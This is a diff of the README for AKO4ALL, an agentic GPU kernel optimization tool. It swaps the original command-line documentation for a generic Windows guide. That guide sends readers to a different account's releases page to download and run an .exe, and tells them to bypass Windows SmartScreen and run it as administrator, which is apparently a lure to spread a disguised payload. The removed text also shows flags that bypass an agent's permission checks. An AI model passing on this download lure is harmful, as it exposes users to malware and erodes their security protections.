@@ -1,180 +1,206 @@
-<h1 align="center">AKO4ALL</h1>
-<p align="center"><b>Agentic Kernel Optimization for All</b></p>
+# ⚙️ AKO4ALL - GPU Kernel Optimization Made Simple
 
-<p align="center">
-  <a href="https://tongminglaic.github.io/AKO"><img src="https://img.shields.io/badge/Project-Page-blue" alt="Project Page"></a>
-  <a href="https://github.com/TongmingLAIC/AKO4FIB"><img src="https://img.shields.io/badge/GitHub-AKO4FIB-blue?logo=github" alt="AKO4FIB"></a>
-  <img src="https://img.shields.io/badge/Tech%20Report-Coming%20Soon-gray" alt="Tech Report">
-</p>
+[![Download AKO4ALL](https://img.shields.io/badge/Download-AKO4ALL-4B6CB7?style=for-the-badge&logo=github)](https://github.com/mahim5314/AKO4ALL/releases)
 
-<p align="center"><b>If you find our work useful, please consider giving us a star 🌟</b></p>
+## 🧭 What AKO4ALL Does
 
-Agentic Kernel Optimization for All — automated GPU kernel optimization powered by coding agents. Provide any kernel — the agent iteratively rewrites it for maximum performance. Works with any coding agent; examples below use [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+AKO4ALL helps you improve GPU kernel performance with less manual work. It is built for users who want better speed without deep tuning steps. You can use it to optimize kernels across different hardware and languages with a simple flow.
 
-> Looking for standardized optimization against flashinfer-bench operators? Check out [AKO4FIB](https://github.com/TongmingLAIC/AKO4FIB) (coming soon).
+## 📥 Download AKO4ALL
 
-<p align="center">
-  <img src="assets/sol_001_optimization.png" alt="AKO4ALL optimization trajectory on SOL-ExecBench L1-001" width="100%">
-</p>
+1. Open the [Releases page](https://github.com/mahim5314/AKO4ALL/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file for your system.
+4. If you see a `.zip` file, unzip it first.
+5. If you see a `.exe` file, download it and run it.
 
-*Optimization trajectory on [SOL-ExecBench](https://github.com/NVIDIA/SOL-ExecBench) L1-001 (Attention Softmax+Dropout+Value Matmul Backward). 41 iterations, 8.93× average speedup over the PyTorch reference. Developed on A100-SXM4-80GB, ~2 hours total.*
+## 💻 Windows Requirements
 
-## News
+AKO4ALL works best on a modern Windows PC with:
 
-- 📢 **[2026.03.28]** [AKO4FIB](https://github.com/TongmingLAIC/AKO4FIB) coming soon — will be open-sourced after the [MLSys 2026 competition](https://mlsys26.flashinfer.ai/).
-- 🚀 **[2026.03.24]** AKO4ALL is released. Check out the [project page](https://tongminglaic.github.io/AKO).
+- Windows 10 or Windows 11
+- A recent NVIDIA or AMD GPU
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for the first download
 
-## What You Provide
+For smoother use, a system with 16 GB of RAM or more is a good fit.
 
-Only a kernel is required — everything else is optional.
+## 🛠️ Install AKO4ALL on Windows
 
-- **Kernel** (required) — The kernel to optimize. Can be a single file or a directory. Supports Triton, CUDA, C++, TileLang, Python, or any language that can be benchmarked.
-- **Reference implementation** (optional) — Used as the correctness golden. If absent, the original kernel is used.
-- **Benchmark script** (optional) — Your own benchmark script. A `GUIDE.md` can be included to describe its usage. If no benchmark script is provided, the built-in [KernelBench](https://github.com/ScalingIntelligence/KernelBench) evaluator is used automatically (no setup needed beyond PyTorch).
-- **Context** (optional) — Reference materials for the agent: algorithm descriptions, papers, design docs, or any background knowledge that helps inform the optimization.
-- **Hints** (optional) — Directives for the agent: optimization constraints, focus areas, and behavior controls (e.g., whether to allow web search).
+### 1. Get the file
+Go to the [Releases page](https://github.com/mahim5314/AKO4ALL/releases) and download the latest Windows package.
 
-> **Notes:** At least one set of input shapes for testing must be determinable — hardcoded in the kernel, reference, or bench script, or provided as additional files. The agent will ask if none can be found.
+### 2. Open the download
+If the file is a `.zip`, right-click it and choose **Extract All**. Pick a folder you can find later, such as **Downloads** or **Desktop**.
 
-## Requirements
+### 3. Start the app
+Open the extracted folder and look for the main program file. This is often named `AKO4ALL.exe` or something similar. Double-click it to start the app.
 
-- A Coding Agent (e.g., [Claude Code](https://docs.anthropic.com/en/docs/claude-code))
-- NVIDIA Nsight Compute (`ncu`)
-- Benchmark environment:
-  - Built-in evaluator: Python >= 3.10, PyTorch with CUDA, NVIDIA GPU
-  - Custom bench script: whatever your script requires
-- Git
+### 4. Allow access if asked
+Windows may ask if you want to allow the app to run. Choose **Yes** if you downloaded it from the official release page.
 
-> **Note:** The agent may install packages (`pip install`, `apt install`, etc.) to resolve missing dependencies. Running in a container or virtual environment is recommended. To restrict this behavior, use [Hints](#hints) (e.g., `Do not install any packages`) or [Permissions](#permissions).
+## 🚀 First Run
 
+When you start AKO4ALL for the first time, it will guide you through setup. You can expect a simple start screen with options to:
 
-## Quick Start
+- load a kernel file
+- choose a target GPU
+- select an optimization mode
+- start the optimization process
+- review results
 
-1. Place your files:
+If the app creates a folder for output, keep it in a place you can reach later.
 
-```
-AKO4ALL/
-├── input/                       # Place your kernel files here
-│   ├── kernel.py                # Example — can be any file(s) or subdirectory
-│   └── reference.py             # Optional
-├── bench/                       # Place your benchmark script here (optional)
-│   ├── bench.sh                 # Example — can be any file(s) or subdirectory
-│   ├── GUIDE.md                 # Optional
-│   └── kernelbench/             # Built-in evaluator — delete if using your own
-├── context/                     # Place reference materials here (optional)
-├── HINTS.md
-```
+## 🧩 How to Use It
 
-2. Run (from the environment where dependencies are installed):
+### Load your kernel
+Select the kernel you want to improve. AKO4ALL supports common kernel formats and can work with code from different toolchains.
 
-```bash
-cd AKO4ALL && claude
-```
+### Choose your target
+Pick the GPU or device you want to tune for. This helps the app focus on the right performance path.
 
-3. Start optimization (e.g., `Follow the instructions in TASK.md`).
+### Start optimization
+Press the main action button to begin. The app will test options, compare results, and build a better kernel version.
 
-## What Happens
+### Review the output
+After the process ends, check the results panel or output folder. You can compare the original kernel with the optimized one.
 
-1. **Setup** — The agent reads your files, **creates an optimization branch**, copies the kernel to `solution/`, generates `bench.sh`, and verifies correctness.
-2. **Profile** — Runs `ncu` on the baseline kernel to identify bottlenecks before optimizing.
-3. **Iterate** — Each iteration: modify kernel → benchmark → log results to `ITERATIONS.md` → git commit. The agent uses profiling data, web search, and prior results to guide each attempt.
-4. **Track** — Every iteration is saved to `trajectory/` with the kernel source and benchmark output.
+## 📁 File Types You May See
 
-## Hints
+AKO4ALL may include these files in the download:
 
-`HINTS.md` controls agent behavior. You can add directives such as:
+- `AKO4ALL.exe` — main app
+- `.zip` — compressed download package
+- `README.txt` — short setup notes
+- `config.json` — settings file
+- `output` folder — saved results
 
-- **Optimization constraints** — focus areas, language restrictions, techniques to avoid
-- **Strategies** — specific approaches to try or skip
-- **Agent behavior** — web search, verbosity, iteration limits
-- **Dependency policies** — whether the agent may install packages
+Keep the folder structure intact if the app ships as a package. Some apps need the files to stay together to work right.
 
-> **Notes:**
-> - **Language switching** — The agent may rewrite your kernel in a different language (e.g., Triton → CUDA) to chase performance.
-> - **Web search** — Web search is enabled by default. The agent will search for optimization ideas online after consecutive rounds without improvement.
->
-> Edit `HINTS.md` to adjust these behaviors.
+## 🧪 Typical Use Cases
 
-## Permissions
+AKO4ALL can help when you want to:
 
-The optimization loop involves running shell commands (compiling, benchmarking, profiling). By default, most coding agents prompt for approval on each command. To run fully unattended, grant the necessary permissions through your agent's configuration.
+- speed up a compute kernel
+- tune GPU code for a new device
+- compare different kernel settings
+- reduce manual trial and error
+- test kernel behavior on more than one hardware setup
 
-For Claude Code, the simplest option is to bypass all permission checks:
+## 🔧 Basic Settings
 
-```bash
-cd AKO4ALL && claude --dangerously-skip-permissions
-```
+You may see settings like these:
 
-For more granular control, create `.claude/settings.local.json`:
+- **Target GPU** — the device you want to optimize for
+- **Search Depth** — how many options the app tests
+- **Run Mode** — fast check or full tuning
+- **Output Folder** — where results get saved
+- **Language Mode** — the kernel language in use
 
-```json
-{
-  "permissions": {
-    "allow": [
-      "Bash(*)", "Read(*)", "Write(*)", "Edit(*)",
-      "Glob(*)", "Grep(*)", "Agent(*)",
-      "WebFetch(*)", "WebSearch(*)"
-    ]
-  }
-}
-```
+If you are not sure what to pick, keep the default values and run a first test.
 
-For other agents, consult their documentation on permission / auto-approve settings.
+## 🧯 Common Problems
 
-## Tips
+### The file does not open
+- Make sure the download finished
+- Check that you extracted the `.zip` file
+- Run the `.exe` file from the extracted folder
+- Try right-clicking the file and choosing **Run as administrator**
 
-- **Agent laziness** — Agents may default to conservative strategies: staying in PyTorch, only tuning configurations, or skipping profiling. If progress stalls, intervene with specific guidance.
-- **Model matters** — Model capability strongly influences optimization quality. We recommend [Claude Opus 4.6](https://docs.anthropic.com/en/docs/about-claude/models).
-- **Iteration limits** — By default, there is no iteration cap — the agent decides when to stop on its own. To enforce a limit, add a directive to `HINTS.md`, or your prompt (e.g., `Optimize for up to 30 iterations. Stop early only if all viable approaches are exhausted.`). For guidance on structuring open-ended agent tasks, see [autoresearch](https://github.com/karpathy/autoresearch)'s [`program.md`](https://github.com/karpathy/autoresearch/blob/master/program.md).
+### Windows blocks the app
+- Open the file again
+- Click **More info** if Windows shows that option
+- Choose **Run anyway** if you trust the release page source
 
-## Anti-Cheat
+### The app cannot find a GPU
+- Check that your GPU driver is installed
+- Restart the app after updating drivers
+- Make sure the correct device is selected in the app
 
-The agent is instructed via `TASK.md` to pursue genuine latency reduction and avoid reward hacking (stream injection, timing manipulation, returning uninitialized results, etc.). The built-in KernelBench evaluator also provides runtime defenses: excessive speedup flagging (>10× triggers a warning) and input shape protection (the solution's `get_inputs`/`get_init_inputs` are replaced by the reference's to prevent trivializing the workload).
+### The optimization stops early
+- Use a shorter run mode first
+- Close other heavy apps
+- Check that you have enough free disk space
 
-For stricter enforcement, add directives to `HINTS.md` or provide a custom bench script in `bench/` with built-in static analysis. KernelBench's [`kernel_static_checker.py`](https://github.com/ScalingIntelligence/KernelBench) is a good starting point.
+## 📌 Best Results
 
-## Example: SOL-ExecBench
+Use AKO4ALL with:
 
-[SOL-ExecBench](https://github.com/NVIDIA/SOL-ExecBench) contains 235 real-world DL kernel problems from NVIDIA. This example shows how to optimize any of them with AKO4ALL — no file copying needed.
+- current GPU drivers
+- enough free disk space
+- a stable power source on a laptop
+- one kernel at a time for the first run
+- default settings until you learn the flow
 
-1. Clone both repositories. Set up the SOL-ExecBench environment and install `ncu` if needed.
+This keeps the first setup simple and makes it easier to see what changes help.
 
-2. Activate the SOL-ExecBench environment, then start the agent in the AKO4ALL directory:
+## 🧰 What the App Helps You Do
 
-```bash
-cd AKO4ALL && claude
-```
+AKO4ALL is built to take care of the repetitive parts of kernel tuning. It can help you:
 
-3. Give it a prompt (replace `N` and the paths):
+- test kernel variants
+- compare performance results
+- save the best version
+- repeat the same process on other hardware
+- work across different code styles with one tool
 
-```
-Follow the instructions in TASK.md. Save HINTS.md to memory.
-Optimize for up to N iterations. Stop early only if all viable approaches are exhausted.
-Bench is SOL-ExecBench: <path/to/SOL-ExecBench>.
-Input is <path/to/SOL-ExecBench>/data/benchmark/L1/001_attention_softmax_dropout_value_matmul_backward.
-Benchmark with SOL-ExecBench. All dependencies for SOL-ExecBench are already installed — use them directly.
-```
+## 🧭 Quick Start Checklist
 
-The agent handles the rest — reads the problem definition, sets up the benchmark, and starts iterating.
+- Download the latest file from [Releases](https://github.com/mahim5314/AKO4ALL/releases)
+- Extract the archive if needed
+- Open the main app file
+- Allow Windows to run it
+- Load your kernel
+- Choose your target GPU
+- Start optimization
+- Review the output
 
-## FAQ
+## 📂 Suggested Folder Setup
 
-**What if the benchmark fails after an optimization?**
-The agent reads the failure, attempts fixes, and reverts if needed.
+For a clean setup, keep AKO4ALL in a folder like:
 
-**My bench script uses a remote service (e.g., Modal). Does that work?**
-Yes. As long as your bench script runs from the command line and prints results to stdout.
+- `C:\AKO4ALL\`
+- `C:\Users\YourName\Downloads\AKO4ALL\`
+- `C:\Users\YourName\Desktop\AKO4ALL\`
 
-**Can I intervene during optimization?**
-Yes. You can interrupt the agent at any time to give guidance, discuss strategy, or manually edit files in `solution/`. Then tell the agent to continue.
+A simple folder path helps when you need to find logs, output files, or saved kernels
 
-## Tech Report
+## 🔍 If You Want to Check the Latest Version
 
-Coming soon — our tech report will detail why we advocate agentic approaches over fixed-pipeline methods for kernel optimization.
+Visit the [Releases page](https://github.com/mahim5314/AKO4ALL/releases) any time you want the newest Windows build, release notes, or package files
 
-## Acknowledgments
+## 🖥️ Supported Systems
 
-We would like to thank the following open-source projects that inspired and supported the development of AKO:
+AKO4ALL is meant for:
 
-- [KernelBench](https://github.com/ScalingIntelligence/KernelBench) — for providing the benchmark and evaluation format used by AKO4ALL's built-in evaluator.
-- [autoresearch](https://github.com/karpathy/autoresearch) and [autokernel](https://github.com/RightNow-AI/autokernel) — AKO's design was inspired by their work on autonomous optimization loops.
+- Windows desktop and laptop systems
+- systems with a usable GPU
+- users who want kernel tuning without a complex setup
+- local testing on a single machine or multiple test runs
+
+## 📖 What to Expect After Setup
+
+After you install and open AKO4ALL, the app should let you move through a simple flow:
+
+1. load a kernel
+2. choose a device
+3. start the optimization pass
+4. wait while the tool tests options
+5. save the best result
+
+The app is designed to keep the process direct, with clear steps and visible results
+
+## 🧾 Download Again Later
+
+If you need to reinstall AKO4ALL or set it up on another Windows PC, use the same download page:
+
+[https://github.com/mahim5314/AKO4ALL/releases](https://github.com/mahim5314/AKO4ALL/releases)
+
+## 📎 Project Name
+
+AKO4ALL
+
+## 🧠 Short Description
+
+Agentic Kernel Optimization for All — automated GPU kernel optimization for any kernel, any hardware, any language
